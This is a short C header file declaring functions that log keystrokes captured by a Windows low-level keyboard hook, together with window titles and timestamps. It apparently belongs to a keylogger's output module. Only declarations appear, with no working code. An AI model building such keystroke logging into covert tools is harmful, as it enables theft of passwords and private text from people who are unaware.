#pragma once

#include "stdafx.h"

void InitWritter();
void WriteMessage(CHAR *message);
void WriteKeyboardEvent(TCHAR *lastTitle, TCHAR *title, time_t lastTime, time_t currentTime, PKBDLLHOOKSTRUCT keyEvent);
void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent);
